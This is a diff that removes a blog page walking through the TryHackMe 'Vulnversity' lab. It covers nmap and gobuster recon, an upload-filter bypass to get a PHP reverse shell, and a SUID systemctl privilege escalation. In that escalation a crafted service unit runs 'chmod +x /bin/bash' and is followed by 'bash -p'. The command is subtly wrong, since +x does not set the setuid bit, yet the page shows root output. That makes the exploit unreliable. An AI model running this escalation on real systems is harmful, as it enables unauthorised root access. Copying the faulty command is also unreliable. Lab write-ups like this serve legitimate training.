@@ -1,819 +1,107 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <title>TryHackMe Room Vulnversity | Classroom</title>
-
-    
-<link href="/img/avatar.jpeg" rel="shortcut icon" type="image/x-icon" />
-
-
-
-
-
-<meta name="author" content="Animesh Roy @anir0y  "  />
-<meta name="description" content="TryHackMe Room Vulnversity solved by Animesh Roy. this is a walkthough. read more..." />
-
-
-
-<title>Animesh Roy | Classroom Posts</title>
-<meta name="title" content="Animesh Roy | Blogs & Writeups">
-<meta name="description" content="Animesh Roy has more than a decade worth experience working in cyber security domain. He has worked with governments, corporates, colleges and universities, defence, and the community. He also running a community “Arishti Live” to help everyone who wants to, or work in cyber security domain. His expertise on training & consulting are the best of both the world. He uses his real-life case studies in trainings, to help candidates to understand the job in better ways.">
-
-
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-SPD6BXK0P5"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-SPD6BXK0P5');
-</script>
-
-
-
-<script type="text/javascript">
-  (function(c,l,a,r,i,t,y){
-      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-  })(window, document, "clarity", "script", "it10lq8bk1");
-</script>
-
-
-
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://classroom.anir0y.in/">
-<meta property="og:title" content="Animesh Roy | Blogs & Writeups">
-<meta property="og:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
-<meta property="og:image" content="https://i.imgur.com/Ji5C41H.png">
-
-
-<script type="text/javascript" charset="UTF-8" src="//cdn.cookie-script.com/s/88cd00f83ae38d0239d06996b1ad293a.js"></script>
-
-
-<meta property="twitter:card" content="summary_large_image">
-<meta property="twitter:url" content="http://localhost:1313/post/thm-room-vulnversity/">
-
-<meta property="twitter:title" content="Animesh Roy | Blogs & Writeups">
-<meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
-<meta property="twitter:image" content="https://i.imgur.com/Ji5C41H.png">
-
-
-
-
-
-
-
-<script data-ad-client="ca-pub-3526678290068011" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-
-
-
-
-<link rel="canonical" href="http://localhost:1313/post/thm-room-vulnversity/" />
-
-
-<meta property="og:url" content="http://localhost:1313/post/thm-room-vulnversity/">
-  <meta property="og:site_name" content="Classroom">
-  <meta property="og:title" content="TryHackMe Room Vulnversity">
-  <meta property="og:description" content="TryHackMe Room Vulnversity solved by Animesh Roy. this is a walkthough. read more...">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="post">
-    <meta property="article:published_time" content="2021-06-09T20:10:48+05:30">
-    <meta property="article:modified_time" content="2021-06-09T20:10:48+05:30">
-    <meta property="article:tag" content="Tryhackme">
-    <meta property="article:tag" content="Rooms">
-    <meta property="article:tag" content="Thm">
-    <meta property="article:tag" content="Vulnversity">
-
-
-
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="TryHackMe Room Vulnversity">
-  <meta name="twitter:description" content="TryHackMe Room Vulnversity solved by Animesh Roy. this is a walkthough. read more...">
-
-
-<link rel="stylesheet" href="/css/semantic.min.css" />
-<link rel="stylesheet" href="/css/icomoon.css" />
-<link rel="stylesheet" href="/css/OverlayScrollbars.min.css" />
-<link rel="stylesheet" href="/css/github-markdown.css" />
-<link rel="stylesheet" href="/css/site.css" />
-<link rel="stylesheet" href="/css/custom.css" />
-
-<style>
-  a:not(.ui.button):hover {
-    text-decoration: underline;
-  }
-
-  
-  a:not(.ui.button) {
-    color: seagreen !important;
-  }
-  
-
-  
-  .inverted a:not(.ui.button),
-  .inverted a:not(.ui.button):hover {
-     color: darkseagreen !important;
-  }
-  
-
-  
-  body.default {
-    
-    background-color: #fff;
-    
-
-    
-  }
-  
-
-  
-  body.dark {
-    
-    background-color: black;
-    
-
-    
-  }
-  
-</style>
-
-
-    
-
-
-
-<link rel="stylesheet" data-highlight href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css" />
-
-
-
-
-
-
-
-    
-    <link rel="stylesheet" href="/css/custom.css" />
-    
-  </head>
-
-  <body class="default">
-    
-<nav class="ui secondary menu dream-menu">
-
-  <div class="item">
-    <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
-  </div>
-  <div class="item">
-    <i class="large link home icon" title="Home" onclick="window.location.href = 'http:\/\/localhost:1313\/'"></i>
-  </div>
-  
-  <div class="item">
-    <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
-  </div>
-  
-  
-  <div class="item">
-    <i class="large link search icon" onclick="toggleSearch()"></i>
-  </div>
-  
-</nav>
-
-    <div class="flip-container">
-      <div class="flipper">
-        <section class="front">
-          <div class="dream-max-width">
-            
-<div class="ui relaxed grid dream-grid dream-grid-single"style="flex-direction: row-reverse;">
-  <aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside">
-    
-    
-    <div class="ui segment toc">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#vulnversity">Vulnversity</a></li>
-    <li><a href="#task-01--deploy-the-machine">TASK 01:  Deploy the machine</a></li>
-    <li><a href="#task-02-reconnaissance">TASK 02: Reconnaissance</a>
-      <ul>
-        <li><a href="#flags">Flags</a></li>
-      </ul>
-    </li>
-    <li><a href="#task-03-locating-directories-using-gobuster">TASK 03: Locating directories using GoBuster</a>
-      <ul>
-        <li><a href="#dir-mode-options"><code>dir</code> Mode Options</a></li>
-        <li><a href="#dns-mode-help">dns Mode Help</a></li>
-        <li><a href="#vhost-mode-options">vhost Mode Options</a></li>
-        <li><a href="#flag-03">Flag-03</a></li>
-      </ul>
-    </li>
-    <li><a href="#task-04-compromise-the-webserver">task 04: Compromise the webserver</a>
-      <ul>
-        <li><a href="#flag-04">Flag-04</a></li>
-      </ul>
-    </li>
-    <li><a href="#task-05-privilege-escalation">Task 05: Privilege Escalation</a>
-      <ul>
-        <li><a href="#flag-05">Flag-05</a></li>
-      </ul>
-    </li>
-    <li><a href="#flag-52">flag-5.2</a></li>
-  </ul>
-</nav>
-    </div>
-    
-    <div class="ui segment actions">
-      <button
-        class="ui circular icon button save-as-image"
-        title="Save as image"
-        onclick="savePostAsImg()">
-        <i class="save icon"></i>
-      </button>
-
-      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Room%20Vulnversity&url=http%3a%2f%2flocalhost%3a1313%2fpost%2fthm-room-vulnversity%2f" class="ui circular twitter icon button">
-  <i class="twitter icon"></i>
-</a>
-<a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fpost%2fthm-room-vulnversity%2f" class="ui circular facebook icon button">
-  <i class="facebook icon"></i>
-</a>
-
-    </div>
-  </aside>
-  <div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id="dream-save-post-as-img">
-    
-    <section class="ui top attached segment">
-      <header>
-        <h1 class="ui large header">TryHackMe Room Vulnversity<div class="sub header">
-            @
-            
-              
-                <a href="https://bit.ly/34sGFiK" target="_blank">Animesh Roy</a>
-              
-            
-
-            | 
-                Wednesday, Jun 9, 2021
-              
-
-            | 5 minutes read
-
-            | Update at
-              
-                Wednesday, Jun 9, 2021
-              
-          </div>
-        </h1>
-      </header>
-
-      <article class="main"><h2 id="vulnversity">Vulnversity</h2>
-<h2 id="task-01--deploy-the-machine">TASK 01:  Deploy the machine</h2>
-<hr>
-<h2 id="task-02-reconnaissance">TASK 02: Reconnaissance</h2>
-<p><strong>Tools</strong></p>
-<ul>
-<li><a href="https://nmap.org">Nmap</a></li>
-<li>CheatSheet</li>
-</ul>
-<h3 id="flags">Flags</h3>
-<table>
-  <thead>
-      <tr>
-          <th style="text-align: left">Flag ID</th>
-          <th style="text-align: center">Questions</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td style="text-align: left">1</td>
-          <td style="text-align: center">There are many nmap &ldquo;cheatsheets&rdquo; online that you can use too.</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center">N\A</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">2</td>
-          <td style="text-align: center">Scan the box, how many ports are open?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><img src="https://i.imgur.com/0XgYocm.png" alt="img"></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">3</td>
-          <td style="text-align: center">What version of the squid proxy is running on the machine?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><img src="https://i.imgur.com/0XgYocm.png" alt="img"></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">4</td>
-          <td style="text-align: center">How many ports will nmap scan if the flag -p-400 was used?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><code>400</code></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">5</td>
-          <td style="text-align: center">Using the nmap flag -n what will it not resolve?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><code>DNS</code></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">6</td>
-          <td style="text-align: center">What is the most likely operating system this machine is running?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><code>ubuntu</code></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">7</td>
-          <td style="text-align: center">What port is the web server running on?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><img src="https://i.imgur.com/Tsd6hc7.png" alt="img-anir0y"></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">8</td>
-          <td style="text-align: center">Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don&rsquo;t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td></td>
-      </tr>
-  </tbody>
-</table>
-<h4 id="flag6">Flag6</h4>
-<p>based on Nmap Fingerprints.</p>
-<hr>
-<!-- Amazon Ads-->
-<script type="text/javascript" language="javascript">
-      var aax_size='300x250';
-      var aax_pubname = 'anir0y-21';
-      var aax_src='302';
-    </script>
-<script type="text/javascript" language="javascript" src="https://c.amazon-adsystem.com/aax2/assoc.js"></script>
-<!-- Amazon Ads-->
-<hr>
-<h2 id="task-03-locating-directories-using-gobuster">TASK 03: Locating directories using GoBuster</h2>
-<h3 id="dir-mode-options"><code>dir</code> Mode Options</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  gobuster dir <span style="color:#f92672">[</span>flags<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Flags:
-</span></span><span style="display:flex;"><span>  -f, --add-slash                     Append / to each request
-</span></span><span style="display:flex;"><span>  -c, --cookies string                Cookies to use <span style="color:#66d9ef">for</span> the requests
-</span></span><span style="display:flex;"><span>  -e, --expanded                      Expanded mode, print full URLs
-</span></span><span style="display:flex;"><span>  -x, --extensions string             File extension<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> to search <span style="color:#66d9ef">for</span>
-</span></span><span style="display:flex;"><span>  -r, --follow-redirect               Follow redirects
-</span></span><span style="display:flex;"><span>  -H, --headers stringArray           Specify HTTP headers, -H <span style="color:#e6db74">&#39;Header1: val1&#39;</span> -H <span style="color:#e6db74">&#39;Header2: val2&#39;</span>
-</span></span><span style="display:flex;"><span>  -h, --help                          help <span style="color:#66d9ef">for</span> dir
-</span></span><span style="display:flex;"><span>  -l, --include-length                Include the length of the body in the output
-</span></span><span style="display:flex;"><span>  -k, --no-tls-validation             Skip TLS certificate verification
-</span></span><span style="display:flex;"><span>  -n, --no-status                     Don<span style="color:#e6db74">&#39;t print status codes
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -P, --password string               Password for Basic Auth
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -p, --proxy string                  Proxy to use for requests [http(s)://host:port]
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -s, --status-codes string           Positive status codes (will be overwritten with status-codes-blacklist if set) (default &#34;200,204,301,302,307,401,403&#34;)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -b, --status-codes-blacklist string Negative status codes (will override status-codes if set)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      --timeout duration              HTTP Timeout (default 10s)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -u, --url string                    The target URL
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -a, --useragent string              Set the User-Agent string (default &#34;gobuster/3.1.0&#34;)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -U, --username string               Username for Basic Auth
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -d, --discover-backup               Upon finding a file search for backup files
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      --wildcard                      Force continued operation when wildcard found
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Global Flags:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -z, --no-progress       Don&#39;</span>t display progress
-</span></span><span style="display:flex;"><span>  -o, --output string     Output file to write results to <span style="color:#f92672">(</span>defaults to stdout<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -q, --quiet             Don<span style="color:#960050;background-color:#1e0010">&#39;</span>t print the banner and other noise
-</span></span><span style="display:flex;"><span>  -t, --threads int       Number of concurrent threads <span style="color:#f92672">(</span>default 10<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>      --delay duration    Time each thread waits between requests <span style="color:#f92672">(</span>e.g. 1500ms<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -v, --verbose           Verbose output <span style="color:#f92672">(</span>errors<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -w, --wordlist string   Path to the wordlist
-</span></span></code></pre></div><h3 id="dns-mode-help">dns Mode Help</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Usage:
-</span></span><span style="display:flex;"><span>  gobuster dns <span style="color:#f92672">[</span>flags<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Flags:
-</span></span><span style="display:flex;"><span>  -d, --domain string      The target domain
-</span></span><span style="display:flex;"><span>  -h, --help               help <span style="color:#66d9ef">for</span> dns
-</span></span><span style="display:flex;"><span>  -r, --resolver string    Use custom DNS server <span style="color:#f92672">(</span>format server.com or server.com:port<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -c, --show-cname         Show CNAME records <span style="color:#f92672">(</span>cannot be used with <span style="color:#e6db74">&#39;-i&#39;</span> option<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -i, --show-ips           Show IP addresses
-</span></span><span style="display:flex;"><span>      --timeout duration   DNS resolver timeout <span style="color:#f92672">(</span>default 1s<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>      --wildcard           Force continued operation when wildcard found
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Global Flags:
-</span></span><span style="display:flex;"><span>  -z, --no-progress       Don<span style="color:#e6db74">&#39;t display progress
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -o, --output string     Output file to write results to (defaults to stdout)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -q, --quiet             Don&#39;</span>t print the banner and other noise
-</span></span><span style="display:flex;"><span>  -t, --threads int       Number of concurrent threads <span style="color:#f92672">(</span>default 10<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>      --delay duration    Time each thread waits between requests <span style="color:#f92672">(</span>e.g. 1500ms<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -v, --verbose           Verbose output <span style="color:#f92672">(</span>errors<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -w, --wordlist string   Path to the wordlist
-</span></span></code></pre></div><h3 id="vhost-mode-options">vhost Mode Options</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Usage:
-</span></span><span style="display:flex;"><span>  gobuster vhost <span style="color:#f92672">[</span>flags<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Flags:
-</span></span><span style="display:flex;"><span>  -c, --cookies string        Cookies to use <span style="color:#66d9ef">for</span> the requests
-</span></span><span style="display:flex;"><span>  -r, --follow-redirect       Follow redirects
-</span></span><span style="display:flex;"><span>  -H, --headers stringArray   Specify HTTP headers, -H <span style="color:#e6db74">&#39;Header1: val1&#39;</span> -H <span style="color:#e6db74">&#39;Header2: val2&#39;</span>
-</span></span><span style="display:flex;"><span>  -h, --help                  help <span style="color:#66d9ef">for</span> vhost
-</span></span><span style="display:flex;"><span>  -k, --no-tls-validation     Skip TLS certificate verification
-</span></span><span style="display:flex;"><span>  -P, --password string       Password <span style="color:#66d9ef">for</span> Basic Auth
-</span></span><span style="display:flex;"><span>  -p, --proxy string          Proxy to use <span style="color:#66d9ef">for</span> requests <span style="color:#f92672">[</span>http<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>://host:port<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>      --timeout duration      HTTP Timeout <span style="color:#f92672">(</span>default 10s<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -u, --url string            The target URL
-</span></span><span style="display:flex;"><span>  -a, --useragent string      Set the User-Agent string <span style="color:#f92672">(</span>default <span style="color:#e6db74">&#34;gobuster/3.1.0&#34;</span><span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -U, --username string       Username <span style="color:#66d9ef">for</span> Basic Auth
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Global Flags:
-</span></span><span style="display:flex;"><span>  -z, --no-progress       Don<span style="color:#e6db74">&#39;t display progress
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -o, --output string     Output file to write results to (defaults to stdout)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  -q, --quiet             Don&#39;</span>t print the banner and other noise
-</span></span><span style="display:flex;"><span>  -t, --threads int       Number of concurrent threads <span style="color:#f92672">(</span>default 10<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>      --delay duration    Time each thread waits between requests <span style="color:#f92672">(</span>e.g. 1500ms<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -v, --verbose           Verbose output <span style="color:#f92672">(</span>errors<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  -w, --wordlist string   Path to the wordlist
-</span></span></code></pre></div><h3 id="flag-03">Flag-03</h3>
-<p>|1|What is the directory that has an upload form page?|
-||<img src="https://i.imgur.com/AaAwcRw.png" alt="img">|</p>
-<hr>
-<h2 id="task-04-compromise-the-webserver">task 04: Compromise the webserver</h2>
-<h3 id="flag-04">Flag-04</h3>
-<table>
-  <thead>
-      <tr>
-          <th style="text-align: left">Flag ID</th>
-          <th style="text-align: center">Questions</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td style="text-align: left">1</td>
-          <td style="text-align: center">Try upload a few file types to the server, what common extension seems to be blocked?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><a href="#flag-41"><code>.php</code></a></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">2</td>
-          <td style="text-align: center">N\a</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">3</td>
-          <td style="text-align: center">Run this attack, what extension is allowed?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><a href="#flag-43"><code>.phtml</code></a></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">4</td>
-          <td style="text-align: center">Get the Shell working</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><a href="https://www.youtube.com/watch?v=QlcZxDPuJTE"><img src="https://img.youtube.com/vi/QlcZxDPuJTE/hqdefault.jpg" alt="Alt text"></a></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">5</td>
-          <td style="text-align: center">What is the name of the user who manages the webserver?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><a href="https://www.youtube.com/watch?v=ugnYyudFY1Y"><img src="https://img.youtube.com/vi/ugnYyudFY1Y/mqdefault.jpg" alt="TryHackMe"></a></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">6</td>
-          <td style="text-align: center">What is the user flag?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><img src="https://i.imgur.com/xDyG5Fq.png" alt="TryHackMe"></td>
-      </tr>
-  </tbody>
-</table>
-<h4 id="flag-41">Flag-4.1</h4>
-<p>php is a common way to get <code>reserse shell/backdoor</code> in web application</p>
-<h4 id="flag-43">Flag-4.3</h4>
-<p>intruder gives you diffrent content-length. you can check the response body to verify.</p>
-<hr>
-<h2 id="task-05-privilege-escalation">Task 05: Privilege Escalation</h2>
-<h3 id="flag-05">Flag-05</h3>
-<table>
-  <thead>
-      <tr>
-          <th style="text-align: left">Flag ID</th>
-          <th style="text-align: center">Questions</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td style="text-align: left">1</td>
-          <td style="text-align: center">On the system, search for all SUID files. What file stands out?</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"><a href="#flag-51">read</a></td>
-          <td style="text-align: center"><a href="#flag-51"><code>/bin/systemctl</code></a></td>
-      </tr>
-      <tr>
-          <td style="text-align: left">2</td>
-          <td style="text-align: center">Become root and get the last flag (/root/root.txt)</td>
-      </tr>
-      <tr>
-          <td style="text-align: left"></td>
-          <td style="text-align: center"><img src="https://i.imgur.com/1qWDfR3.png" alt="img"></td>
-      </tr>
-  </tbody>
-</table>
-<h4 id="flag-51">flag-5.1</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ find / -user root -perm -4000 -exec ls -ldb <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
-</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
-</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">659856</span> Feb <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2019</span> /bin/systemctl
-</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
-</span></span></code></pre></div><blockquote>
-<p>credit : <a href="https://gtfobins.github.io/gtfobins/systemctl/">Gtfo bins</a></p></blockquote>
-<p><img src="https://i.imgur.com/5z5748W.png" alt=""></p>
-<h2 id="flag-52">flag-5.2</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Run the followning</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>.service
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;[Service]
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type=oneshot
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ExecStart=/bin/sh -c &#34;chmod +x /bin/bash&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Install]
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WantedBy=multi-user.target&#39;</span> &gt; $TF
-</span></span><span style="display:flex;"><span>./systemctl link $TF
-</span></span><span style="display:flex;"><span>./systemctl enable --now $TF
-</span></span></code></pre></div><p>after successfull run. do this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id
-</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/bin/bash -p <span style="color:#75715e">#to exploit and gain root priv</span>
-</span></span><span style="display:flex;"><span>id
-</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
-</span></span></code></pre></div><!-- Amazon Ads-->
-<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
-<script type="text/javascript" language="javascript">
-      var aax_size='300x250';
-      var aax_pubname = 'anir0y-21';
-      var aax_src='302';
-    </script>
-<script type="text/javascript" language="javascript" src="https://c.amazon-adsystem.com/aax2/assoc.js"></script>
-<!-- Amazon Ads-->
-<hr>
-</article>
-    </section>
-
-    
-
-    
-
-    
-  </div>
-</div>
-
-
-            <footer class="ui basic center aligned segment" style="background-color: transparent;">
-              
-              <p>© 2010 - 2026 Classroom</p>
-              
-
-              
-
-              
-            </footer>
-          </div>
-        </section>
-        <section class="back">
-          <div class="dream-max-width">
-            <header class="ui basic very padded segment dream-header">
-  <div class="ui small circular image">
-    
-    <img src="/img/avatar.jpeg" />
-    
-  </div>
-
-  <div class="content">
-    <h1 class="ui medium header">Reading Stuffs<div class="sub header"></div>
-    </h1>
-
-    <article class="ui horizontal list">
-      
-      <a class="item" href="/categories">
-        <i class="th list icon" title="All Categories"></i>
-      </a>
-      <a class="item" href="/tags">
-        <i class="tags icon" title="All Tags"></i>
-      </a>
-    </article>
-
-  </div>
-</header>
-
-
-<div class="ui relaxed grid dream-grid dream-back">
-  
-  
-  
-
-  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
-    <article class="ui segment">
-      <h3 class="ui header">Social Links</h3>
-      <nav class="ui secondary menu dream-menu dream-socials">
-  
-  <div class="item">
-    <a href="/index.xml">
-      <i class="large rss square icon" title="RSS"></i>
-    </a>
-  </div>
-  
-
-  
-  <div class="item">
-    <a href="mailto:classroom@anir0y.in">
-      <i class="large mail icon" title="Email"></i>
-    </a>
-  </div>
-  
-
-  
-  <div class="item">
-    <a href="https://twitter.com/anir0y" target="_blank">
-      <i class="large twitter icon" title="Twitter"></i>
-    </a>
-  </div>
-  
-
-  
-  <div class="item">
-    <a href="https://facebook.com/0xanir0y" target="_blank">
-      <i class="large facebook icon" title="Facebook"></i>
-    </a>
-  </div>
-  
-
-  
-  <div class="item">
-    <a href="https://instagram.com/0xanir0y" target="_blank">
-      <i class="large instagram icon" title="Instagram"></i>
-    </a>
-  </div>
-  
-
-  
-
-  
-  <div class="item">
-    <a href="https://www.linkedin.com/in/anir0y" target="_blank">
-      <i class="large linkedin icon" title="Linkedin"></i>
-    </a>
-  </div>
-  
-
-  
-  <div class="item">
-    <a href="https://github.com/anir0y" target="_blank">
-      <i class="large github icon" title="GitHub"></i>
-    </a>
-  </div>
-  
-
-  
-
-  
-</nav>
-
-    </article>
-  </div>
-
-  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
-    
-    <article class="ui segment">
-      YOU CAN REUSE MY CONTENT
-    </article>
-    
-  </div>
-
-  
-  
-  
-</div>
-
-          </div>
-        </section>
-      </div>
-    </div>
-
-    <script>
-  window.defaultDark =  null 
-  window.backgroundDark = "black"
-  window.backgroundImageDark =  null 
-  window.darkNav =  true 
-  window.hasTwitterEmbed =  true 
-
-  if (window.hasTwitterEmbed) {
-    
-    window.twttr = (function (d, s, id) {
-      var js,
-        fjs = d.getElementsByTagName(s)[0],
-        t = window.twttr || {}
-      if (d.getElementById(id)) return t
